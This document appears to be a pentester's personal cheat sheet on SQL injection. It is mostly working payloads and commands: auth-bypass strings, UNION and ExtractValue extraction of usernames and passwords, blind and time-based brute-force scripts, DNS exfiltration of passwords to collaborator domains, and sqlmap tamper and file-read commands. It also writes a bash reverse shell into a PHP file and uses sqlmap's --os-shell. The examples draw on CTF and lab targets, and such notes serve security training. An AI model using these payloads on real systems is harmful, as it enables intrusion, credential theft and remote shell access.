	\u0074\u0065\u0073\u0074\u0027\u0020\u0055\u004E\u0049\u004F\u004E\u0020\u0041\u004C\u004C\u0020\u0053\u0045\u004C\u0045\u0043\u0054\u0020\u0035\u0038\u002C\u0035\u0038\u002C\u0035\u0038\u002C\u0044\u0045\u0046\u0041\u0055\u004C\u0054\u005F\u0044\u004F\u004D\u0041\u0049\u004E\u0028\u0029\u002C\u0035\u0038\u002D\u002D\u0020\u0067\u0078\u0051\u006D

## DETECTION

- Try to identify a vuln input with simple payloads like these  

		'
		''
		`
		``
		,
		"
		""
		/
		//
		\
		\\
		;
		' or "
		-- or # 
		' OR '1
		' OR 1 -- -
		" OR "" = "
		" OR 1 = 1 -- -
		' OR '' = '
		'='
		'LIKE'
		'=0--+
		 OR 1=1
		' OR 'x'='x
		' AND id IS NULL; --
		'''''''''''''UNION SELECT '2
		%00
		/*…*/ 
		+        addition, concatenate (or space in url)
		||        (double pipe) concatenate
		%        wildcard attribute indicator
		@variable    local variable
		@@variable    global variable
		# Numeric
		AND 1
		AND 0
		AND true
		AND false
		1-false
		1-true
		1*56
		-2
		1' ORDER BY 1--+
		1' ORDER BY 2--+
		1' ORDER BY 3--+
		1' ORDER BY 1,2--+
		1' ORDER BY 1,2,3--+
		1' GROUP BY 1,2,--+
		1' GROUP BY 1,2,3--+
		' GROUP BY columnnames having 1=1 --
		-1' UNION SELECT 1,2,3--+
		' UNION SELECT sum(columnname ) from tablename --
		-1 UNION SELECT 1 INTO @,@
		-1 UNION SELECT 1 INTO @,@,@
		1 AND (SELECT * FROM Users) = 1    
		' AND MID(VERSION(),1,1) = '5';
		' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
		Finding the table name
		Time-Based:
		,(select * from (select(sleep(10)))a)
		%2c(select%20*%20from%20(select(sleep(10)))a)
		';WAITFOR DELAY '0:0:30'--
		Comments:
		#        Hash comment
		/*      C-style comment
		-- -    SQL comment
		;%00    Nullbyte
		`        Backtick

- Automate the detection task with FUZZ  

		wfuzz -u http://10.10.10.179/some/url -w /opt/seclists/fuzzing/special-chars.txt -d '{"name":"FUZZ"}' -c -s 3

		-d:  
		-c:  
		-s:  

- Wordlists 

	- Seclist
	- Fuzzdb
	- Custom list in `toolbox`

- Notes: Check the syntax with or without the )*  

## SQLi Auth Bypass

		'-'
		' '
		'&'
		'^'
		'*'
		' or ''-'
		' or '' '
		' or ''&'
		' or ''^'
		' or ''*'
		"-"
		" "
		"&"
		"^"
		"*"
		" or ""-"
		" or "" "
		" or ""&"
		" or ""^"
		" or ""*"
		or true--
		" or true--
		' or true--
		") or true--
		') or true--
		' or 'x'='x
		') or ('x')=('x
		')) or (('x'))=(('x
		" or "x"="x
		") or ("x")=("x
		")) or (("x"))=(("x
		or 1=1
		or 1=1--
		or 1=1#
		or 1=1/*
		admin' --
		admin' #
		admin'/*
		admin' or '1'='1
		admin' or '1'='1'--
		admin' or '1'='1'#
		admin' or '1'='1'/*
		admin'or 1=1 or ''='
		admin' or 1=1
		admin' or 1=1--
		admin' or 1=1#
		admin' or 1=1/*
		admin') or ('1'='1
		admin') or ('1'='1'--
		admin') or ('1'='1'#
		admin') or ('1'='1'/*
		admin') or '1'='1
		admin') or '1'='1'--
		admin') or '1'='1'#
		admin') or '1'='1'/*
		1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
		admin" --
		admin" #
		admin"/*
		admin" or "1"="1
		admin" or "1"="1"--
		admin" or "1"="1"#
		admin" or "1"="1"/*
		admin"or 1=1 or ""="
		admin" or 1=1
		admin" or 1=1--
		admin" or 1=1#
		admin" or 1=1/*
		admin") or ("1"="1
		admin") or ("1"="1"--
		admin") or ("1"="1"#
		admin") or ("1"="1"/*
		admin") or "1"="1
		admin") or "1"="1"--
		admin") or "1"="1"#
		admin") or "1"="1"/*
		1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055

## UNION-based Injection
https://portswigger.net/web-security/sql-injection/union-attacks  
https://portswigger.net/web-security/sql-injection/cheat-sheet

For a UNION query to work, two key requirements must be met:

- Each SELECT statement within UNION must have the same number of columns
- The columns must also have similar data types
- The columns in each SELECT statement must also be in the same order- The individual queries must return the same number of columns.

***
If we have an answer from mysql like `Bad request` then it means that we can inject something.
Try to guess and recreate the mysql command on the backend to define the injection point (see Ippsec Redcross video)

Example:  

		select message from table where (message like '5' or dest like '<injection point>') LIMIT 10
		\\ Become  
		select message from table where (message like '5' or dest like '<injection point>') -- - ') LIMIT 10

See doc: https://www.w3schools.com/php/php_mysql_select_where.asp
***
- First, you should try to identify which comment symbol is working  

		param=abc'#
		param=abc'--
		param=abc'/*comment*/
		param=abc'\\

- Verify the `Union injection` by identifying the number of columns in the current table.

		' order by 1;
		' order by 2;
		' order by 3;
		' order by 3--

		' union select NULL,NULL,NULL-- //**if we have 3 columns**//

		\\ Oracle version
		' union select NULL,NULL,NULL FROM DUAL--

	**On `Oracle` databases every `select` query should have an `EXPLICIT` table to query from.*

- (Optional) Verify which columns contains text using a payload like the following. Here we have 2 columns in the table.

		'+UNION+SELECT+NULL,'abc'--

### Basic UNION Injection

- Get database infos  
	- MySQL

			' union select user(),NULL,NULL--
			' union select database(),NULL,NULL--
			' union select version(),NULL,NULL--

	- Oracle

			' UNION SELECT NULL,banner FROM v$version--
			' UNION SELECT NULL,version FROM v$instance--

	- Mircrosoft

			' UNION SELECT null,@@version#

- Get a value in columns

		category='UNION SELECT NULL,'2a6ups',NULL--

- Get all tables / look for a particular table  

		' ORDER BY 3--
		' UNION SELECT username,password FROM USERS--

		' union select 1,table_name,null,null,5 from information_schema.tables
		' union select 1,column_name,null,null,5 from information_schema.columns where table_name = 'tableimlookingfor'

		' union,select,null,user(),database(),null,table_name,from,information_schema.tables,LIMIT,0,50  
		' union,select,null,user(),table_name,null,null,from,information_schema.tables,where,table_schema = 0x7061726b,LIMIT,1,2  

		\\ Oracle
		\\ SELECT * FROM all_tables
		' UNION SELECT NULL, table_name FROM all_tables--
		' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'


- Get the content of a particular table

		' UNION SELECT NULL,username||'~'||password FROM users--
***
### Login Bypass

- Bypass login page with UNION attack:  

		username=admin' UNION SELECT '123' AS password FROM admins WHERE '1'='1&password=123 

		Is interpreted as:

		SELECT password FROM admins WHERE username='admin' UNION SELECT '123' AS password

***

### Files manipulation

- Accessing files  

		' union select 1,LOAD_FILE('c:/windows/system32/license.rtf'),3--

- Get a file  

		http://url.com/fetch?id=-1 UNION select 'main.py'

	**The `-1` should be number that report an error.**


- Write file  

		' union select null,'example example',null into OUTFILE '/var/www/mywebserver/example.txt'

***
### Active Directory Access From a UNION Injection
- QUERY AD DOMAIN CONTROLER  
https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html  
https://keramas.github.io/2020/03/22/mssql-ad-enumeration.html  
[Python - Brute Force AD From SQLi](evernote:///view/154730691/s619/1bc19770-5c80-e063-dceb-edb4f3f302c1/1d460891-63f3-60f9-1414-81daf5a18a5c/)

		test' UNION ALL SELECT 58,58,58,DEFAULT_DOMAIN(),58-- gxQm

		test' UNION ALL SELECT 58,58,58,SUSER_SID('MEGACORP\Domain Admins'),58-- gxQm

		test' UNION ALL SELECT 58,58,58,master.dbo.fn_varbintohexstr(SUSER_SID('MEGACORP\Domain Admins')),58-- gxQm

	*I know the default administrator is RID 500. So I can make this RID by taking 500, converting to hex (0x1f4), padding it to 4 bytes (0x000001f4), and reversing the byte order (0xf4010000). So the administrator RID should be 0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000. To check, I’ll run SUSER_SNAME:*  

		test' UNION ALL SELECT 58,58,58,SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000),58-- gxQm

	Then we can automate the task by creating a pyton  script like this one [Python - Brute Force AD From SQLi](evernote:///view/154730691/s619/1bc19770-5c80-e063-dceb-edb4f3f302c1/1d460891-63f3-60f9-1414-81daf5a18a5c/).
***
### Stacked queries  
https://secureops.io/2019/09/magical-image-gallery/  

	id=1; update photos set filename= '*|| ls ./files > temp.txt' where id=3; commit; --
	id=1; update photos set filename= '*|| env > temp.txt' where id=3; commit; --
	id=4 UNION select 'temp.txt'
***
### SQLITE  
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md  
https://www.tariqhawis.com/htb-under-construction-web-challange/  

	SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
	test1' AND 1=0 UNION SELECT 1,(SELECT group_concat(sql) FROM sqlite_master),3;--

	- Get columns from a table  

			' union select 1,username,column_name,is_admin,5 from tableimlookingfor
			jurassic/item.php?id=1,union,select,null,user(),column_name,null,null,from,information_schema.columns,where,table_name = 0x7573657273,LIMIT,1,1  

***
### Get a shell from an UNION Injection  

		union select '<?passthru("bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'");?>', null into outfile '/tmp/reverse.php'
***
### Bypass filtering

- If some characters are not allowed, like the quote ('), we can try different techniques  

	- Encode it in url format.
	- Remove it from the injection and if needed encode strings in Hex.
	- Remove the first quote if needed and replace by AND if possible.

- For example:

		' union select 1,column_name,null,null,5 from information_schema.tables where table_schema = 'tableimlookingfor'

		\\ BECOMES

		AND union select 1,column_name,null,null,5 from information_schema.tables where table_schema = 0x7461626c65696d6c6f6f6b696e6666f72

- If some words are filtered, we can try to mix different cases  

		AND, AnD, aNd, aND, And
		union select 1,2 %23
		uNioN sEleCt 1,2 %23
		uNioN+sEleCt+1,2+%23
		uNioN/**/sEleCt/**/1,2/**/%23

## ExtractValue Method

- Get the mariadb version  

		') and extractvalue(0x0a,version()) -- -

		\\ OR

		') and extractvalue(0x0a,concat(0x0a,version())) -- -

- Get the Schema infos  
	https://dev.mysql.com/doc/refman/8.0/en/information-schema.html  
	https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html  

		') and extractvalue(0x0a,concat(0x0a,(select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA))) -- -

		\\ OR We can limit the result to 1

		') and extractvalue(0x0a,concat(0x0a,(select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA LIMIT 1))) -- -

	*Notes:*  

	*[extractvalue](https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_extractvalue) :  ExtractValue(xml_frag, xpath_expr)*  

	*[xpath](https://www.w3schools.com/xml/xpath_syntax.asp): XPath is a query language for selecting nodes from an XML document.*  

	*0x0A: White space character as a canonicalized version*  

- Get the databases names  
	https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html  

		') and extractvalue(0x0a,concat(0x0a,(select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1))) -- -

		OR

		') and extractvalue(0x0a,concat(0x0a,(select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA LIMIT 1,2))) -- -

		OR

		') and extractvalue(0x0a,concat(0x0a,(select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA LIMIT 1,3))) -- -

- Get infos from tables  

		') and extractvalue(0x0a,concat(0x0a,(select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA like "redcross" LIMIT 0,1))) -- -

		THEN

		') and extractvalue(0x0a,concat(0x0a,(select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA like "redcross" LIMIT 1,1))) -- -

		THEN

		') and extractvalue(0x0a,concat(0x0a,(select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA like "redcross" LIMIT 2,1))) -- -

- Get infos from columns  
	https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html  

		') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 0,1))) -- -

		THEN

		') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "passwords" LIMIT 0,1))) -- -

- Get usernames  

		') and extractvalue(0x0a,concat(0x0a,(select username from redcross.users LIMIT 0,1))) -- -

		THEN

		') and extractvalue(0x0a,concat(0x0a,(select username from redcross.users LIMIT 1,1))) -- -

		THEN

		') and extractvalue(0x0a,concat(0x0a,(select username from redcross.users LIMIT 2,1))) -- -

- Get passwords  

	Pay attention to the xpath because it's limited to 32 characters so we have to do multiple queries to extract the entire hash/password.

		') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 0,1) FROM 1))) -- -

	Then we get the second part

		') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 0,1) FROM 32))) -- -

## BLIND SQL INJECTION
https://github.com/swisskyrepo/PayloadsAllTheThings  
https://portswigger.net/web-security/sql-injection/blind  
https://delayma.wordpress.com/2019/01/09/magical-image-gallery-1-3-hacker-101-ctf/  

- Detect a blind SQL Injection  

	- Identify the 'normal behavior' of the page by by feeding the input or the cookie with the attended string.
	- Inject some code and identify if the page respond differently.

		- From here, we can have two different behavior:

			- A conditional response:
				- It means that the page will render slightly differently. We should compare the page with the orginal one using `Vim` or looking at the page length.

			- A conditional error:
				- The page will not render properly, you'll get an error instead.

			- A time delay response:
				- The page will render as usual but if puted a `time delay injection`, then the rendering will be delay.
				- Example of delay payload:

						'||pg_sleep(5)--

	- Then, try to recreate the normal behavior by injecting a payload. This way we have 2 states. One for positive and one for a negative answer.
		- Pay attention to the `'`. If we put an other quotes `''` and get a valid answer, then it might be another type of injection (not sql). So we need to verify that the server interpret an `sql` command by putting a code inside the `'`, like this `'<code>'`.
		- For example (Oracle):

				'||(SELECT '' FROM dual)||'

	- Example of payload ***(Don't put a comment at the end)***  

			' and 1=1
			' and 1=0
			' AND 1
			' AND TRUE
			' AND '1'='1
			') or ('1'='1
			') or '1'='1

	- We can use `Vim` to compare the 2 responses from the server.
		- Open `Vim` and paste the first response.
		- Next, open a new window
				:vnew
		- Paste the second response in the new window.
				:windo diffthis
		- To terminate we can type
				:diffoff!

***
### Conditional Response Blind Injections
- Length of current DB name in use  

		/a6d92f8421/fetch?id=1 AND LENGTH(database())=6

		6 found as valid length

- Confirm that a table exist  

	- To confirm that a table exist, we can use [Litteral strings explanation](http://www.geeksengine.com/database/basic-select/literal-character-strings.php)
 instead of real column name.

			' AND (SELECT 'a' FROM users LIMIT 1)='a

	- Oracle (concatenation method)

			'||(SELECT '' FROM users WHERE ROWNUM=1)||'

		Notice the `rownum`. If we don't use it, then we'll got more than 1 result and we'll break the concatenation.

- Confirm that a record exist  

  		' AND (SELECT 'a' FROM users WHERE username='administrator')='a

- Get the password (or other value) length of a specific record

		' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a

	- The result of the above command should be true. Then we can increment the `length` value by one, until the result is false. s

- Brute force the password or any other value of a specific record
	- Use `ZAP` or `Python` to automate the request below.
	- The payload marker should be on the `a` at the end of the request.
	- Then we just need to cycle through every letter.

			' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

	- Once we've found the first character, then we can increment the substring value.

			' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
***
### Conditional Errors Method  
https://portswigger.net/web-security/sql-injection/cheat-sheet

- Verify that the conditional method works (Oracle)

		SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual

	- With a `concat` type of attack

			'||(SELECT CASE WHEN (1=0) THEN to_char(1/0) ELSE NULL END FROM dual)||'

- Verify a username from a table with the conditional error method (Oracle and concat attack type)

		'||(SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM users WHERE username='administrator')||'

- Get password length for a specific username using conditional error method (Oracle and concat attack type)

		'||(SELECT CASE WHEN length(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

- Get password for a specific username using conditional error method (Oracle and concat attack type)

		'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN to_char(1/0) ELSE NULL END FROM users WHERE username='administrator')||'

	- Example of script:

		```
		#!/usr/bin/fish

		set trueValue 21
		set password ''

		for num in (seq 1 20)
			for l in (cat alphanum-case-extra.txt)
				set request (curl "https://ac121f501eea5f11808d0292003c00d2.web-security-academy.net/login" \
				-s \
				--cookie "TrackingId=AM7WKP6V4lOY0q7H'||(SELECT CASE WHEN SUBSTR(password,$num,1)='$l' \
					THEN to_char(1/0) ELSE NULL END \
					FROM users \
					WHERE username='administrator')||'" | \
				wc -c)
				if test $request -lt 1000
					set password $password$l
					echo $password
					break
				end
			end
		end
		```
***
### Time-based method

- Verify that the conditional method works (PostgreSQL)

		SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(3) ELSE NULL END

	- With a `concat` type of attack

			'||(SELECT CASE WHEN (1=0) THEN pg_sleep(3) ELSE NULL END)--

- Verify a username from a table with the conditional error method (PostgreSQL and concat attack type)

		'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END FROM users WHERE username='administrator')--

- Get password length for a specific username using conditional error method (PostgreSQL and concat attack type)

		'||(SELECT CASE WHEN length(password)>1 THEN pg_sleep(3) ELSE '' END FROM users WHERE username='administrator')--

- Get password for a specific username using conditional error method (PostgreSQL and concat attack type)

		'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN pg_sleep(3) ELSE NULL END FROM users WHERE username='administrator')--

	Example of script:
	```
	#!/usr/bin/fish

	set trueValue 3000000 
	set password ''

	for num in (seq 1 20)
		for l in (cat alphanum-case-extra.txt)
			set request (curl "https://acbc1f781ecd479f80810f4000ab0023.web-security-academy.net/filter?category=Lifestyle" \
			-s \
			--cookie "TrackingId=7tajrIKtZFAUDUDd'||(SELECT CASE WHEN SUBSTR(password,$num,1)='$l' \
				THEN pg_sleep(3) \
				ELSE NULL END \
				FROM users WHERE username='administrator')--" \
			-o /dev/null \
			-w "%{time_total}")
			if test $request -gt $trueValue
				set password $password$l
				echo $password
				break
			end
		end
	end
	```
***

### Out-Of-Band Data Exfiltration (OAST)
https://medium.com/bugbountywriteup/out-of-band-oob-sql-injection-87b7c666548b
https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/

Set up an Out-Of-Band attack with `Responder`  
https://omercitak.com/out-of-band-attacks-en/

If an application processes the request asynchronously, then the application's response doesn't depend on whether the query returns any data, or on whether a database error occurs, or on the time taken to execute the query. In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control.

A variety of network protocols can be used for this purpose, but typically the most effective is DNS.

The easiest and most reliable way to use out-of-band techniques is using Burp Collaborator. This is a server that provides custom implementations of various network services (including DNS), and allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application.

- On Microsoft SQL Server, input like the following can be used to cause a DNS lookup on a specified domain:

		'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--

- This will cause the database to perform a lookup for the following domain:

		0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net

- Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:

		'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--

- This input reads the password for the Administrator user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This will result in a DNS lookup like the following, allowing you to view the captured password:

		S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net

- XML Payloads
	- Confirm that we get the DNS request

			'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//x.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--

	- Exploit the vulnerability and grab the password for a specific user

			'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--


***
### Brute force the `LIKE` parameter

- We can brute force the param `LIKE` to get the table name

		/a6d92f8421/fetch?id=1 AND database() LIKE '______'
		level5 found as valid name

- Count tables in db  

		/a6d92f8421/fetch?id=1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=2
		2 found as valid count

- Table1 name length  

		/a6d92f8421/fetch?id=1 AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)=6

- Query to get name  

	- We can brute force the param `LIKE` to get the table name

			/a6d92f8421/fetch?id=1 AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) LIKE '______'
			albums found

- *Table 2 name length*  

		/a6d92f8421/fetch?id=1 AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)=6

- *Query to get name*  

	- We can brute force the param `LIKE` to get the table name

			/a6d92f8421/fetch?id=1 AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) LIKE '______'
			photos found

- Then SQLMap to dump the tables:

		sqlmap -u "http://35.237.57.141:5001/b09a24aa14/fetch?id=2" --method GET --dump -D level5 -T photos -p id --code 200 --skip-waf --random-agent --threads 10 -o

## SQLMap (Automatic enumeration)
https://thegreycorner.com/2017/01/05/exploiting-difficult-sql-injection.html
https://github.com/sqlmapproject/sqlmap/wiki/Usage  
https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423  
***
**Before checking anything, check the header to see if the website is using unicode encoding or something else. If this is the case, we need to convert everything in unicode with cyberchef or zap.**  

https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html  

	sqlmap -r colleagues.request --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --proxy http://127.0.0.1:8080 --dbs
	sqlmap -r colleagues.request --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --proxy http://127.0.0.1:8080 --dump-all --exclude-sysdbs
***
### Standard command  

	sqlmap -u http://blabla.com/ --data "name=ghost&password=ghost" --batch --level 5 --risk 3 -b --threads 10

	sqlmap -u "http://testsite.com/login.php" --dbs
	sqlmap -u "http://testsite.com/login.php" -D site_db --tables
	sqlmap -u "http://testsite.com/login.php" -D site_db -T users –dump
	sqlmap -u "http://testsite.com/login.php" -D site_db -T users --columns

### Tamper scripts  

	apostrophemask
	apostrophenullencode
	appendnullbyte
	base64encode
	between
	bluecoat
	chardoubleencode
	charencode
	charunicodeencode
	concat2concatws
	equaltolike
	greatest
	halfversionedmorekeywords
	ifnull2ifisnull
	modsecurityversioned
	modsecurityzeroversioned
	multiplespaces
	nonrecursivereplacement
	percentage
	randomcase
	randomcomments
	securesphere
	space2comment
	space2dash
	space2hash
	space2morehash
	space2mssqlblank
	space2mssqlhash
	space2mysqlblank
	space2mysqldash
	space2plus
	space2randomblank
	sp_password
	unionalltounion
	unmagicquotes
	versionedkeywords
	versionedmorekeywords

- Example of command:

		sqlmap -u 'http://www.site.com:80/search.cmd?form_state=1’ --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords

***
### Look for a specific value with `sqlmap`
		sqlmap.py -u "http://192.168.1.1/mypath/mypoorlywrittenapp.asp?SessionID=" --search -C 'password'

### Get a shell from sqlmap  
	http://10.10.10.46/dashboard.php?search=a  

	sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=73jv7pdmjsv7dsspoqtnlv66ls"
	sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=73jv7pdmjsv7dsspoqtnlv66ls" --os-shell

	bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'
	SHELL=/bin/bash script -q /dev/null

	sqlmap -r search.req --dbms mysql --technique=U --dump --batch

	\\ AND/OR

	sqlmap -r search.req --dbms mysql --technique=U --users

	\\ AND/OR

	sqlmap -r search.req --dbms mysql --technique=U --passwords

	sqlmap -u http://vuln.website.com/index.php?vulmparam=test --sql-shell

### Read a file from sqlmap

	sqlmap -r req.raw --batch --file-read=/etc/passwd --level 3 --threads 10
	
		     ___
	       __H__
	 ___ ___[.]_____ ___ ___  {1.5#stable}
	|_ -| . [)]     | .'| . |
	|___|_  [.]_|_|_|__,|  _|
	      |_|V...       |_|   http://sqlmap.org

	[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

	[*] starting @ 16:17:09 /2021-01-30/

	[16:17:09] [INFO] parsing HTTP request from 'req.raw'
	[16:17:09] [INFO] resuming back-end DBMS 'mysql' 
	[16:17:09] [INFO] testing connection to the target URL
	sqlmap resumed the following injection point(s) from stored session:
	---
	Parameter: id (GET)
	    Type: boolean-based blind
	    Title: AND boolean-based blind - WHERE or HAVING clause
	    Payload: id=3 AND 1576=1576

	    Type: time-based blind
	    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
	    Payload: id=3 AND (SELECT 2164 FROM (SELECT(SLEEP(5)))jTxc)

	    Type: UNION query
	    Title: Generic UNION query (NULL) - 3 columns
	    Payload: id=3 UNION ALL SELECT NULL,NULL,CONCAT(0x71626a6b71,0x6c73436f5761774842726e42666b4a67566c4a6766536f4e596d58744c7468527257774359507142,0x717a767a71)-- -
	---
	[16:17:09] [INFO] the back-end DBMS is MySQL
	back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
	[16:17:09] [INFO] fingerprinting the back-end DBMS operating system
	[16:17:09] [INFO] the back-end DBMS operating system is Linux
	[16:17:09] [INFO] fetching file: '/etc/passwd'
	do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
	[16:17:09] [INFO] the local file '/home/R0cK/.local/share/sqlmap/output/104.248.164.187/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (982 B)
	files saved to [1]:
	[*] /home/R0cK/.local/share/sqlmap/output/104.248.164.187/files/_etc_passwd (same file)

	[16:17:09] [INFO] fetched data logged to text files under '/home/R0cK/.local/share/sqlmap/output/104.248.164.187'

	[*] ending @ 16:17:09 /2021-01-30/

- *SQLMap won't show the file content in the output but it stores the file on the local machine. Here the path is `/home/R0cK/.local/share/sqlmap/output/104.248.164.187`.*
- Notes:  

***--Batch:*** *No questions from sqlmap*  
***--force-ssl:*** *Force ssl*  
***--dbms:*** *If we know the database type, we can specify it directy to speed up the output*  
***
### Identify `Time-based` injection with sqlmap.

- Identify the database

		sqlmap -r req.raw --batch --level 5 --threads 10 --risk 3 --dbms mysql --tamper=charunicodeescape --proxy http://127.0.0.1:8080 --technique=T

		     ___
		       __H__
		 ___ ___[.]_____ ___ ___  {1.5#stable}
		|_ -| . [,]     | .'| . |
		|___|_  [.]_|_|_|__,|  _|
		      |_|V...       |_|   http://sqlmap.org

		[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

		[*] starting @ 14:30:07 /2021-01-31/

		[14:30:07] [INFO] parsing HTTP request from 'req.raw'
		[14:30:07] [INFO] loading tamper module 'charunicodeescape'
		custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
		JSON data found in POST body. Do you want to process it? [Y/n/q] Y
		[14:30:08] [INFO] testing connection to the target URL
		[14:30:08] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON #1*' might not be injectable
		[14:30:08] [INFO] testing for SQL injection on (custom) POST parameter 'JSON #1*'
		[14:30:08] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
		[14:30:08] [WARNING] time-based comparison requires larger statistical model, please wait............................ (done)                                                                   
		[14:30:21] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
		[14:30:21] [INFO] checking if the injection point on (custom) POST parameter 'JSON #1*' is a false positive
		(custom) POST parameter 'JSON #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
		sqlmap identified the following injection point(s) with a total of 63 HTTP(s) requests:
		---
		Parameter: JSON #1* ((custom) POST)
		    Type: time-based blind
		    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
		    Payload: {"user":"' AND (SELECT 3680 FROM (SELECT(SLEEP(5)))wJkX)-- tmXO"}
		---
		[14:31:13] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
		[14:31:13] [INFO] the back-end DBMS is MySQL
		[14:31:13] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
		back-end DBMS: MySQL >= 5.0.12
		[14:31:14] [INFO] fetched data logged to text files under '/home/R0cK/.local/share/sqlmap/output/134.209.31.231'

- Then extract the database name with the `--dbs` param: (it might take a while)
	
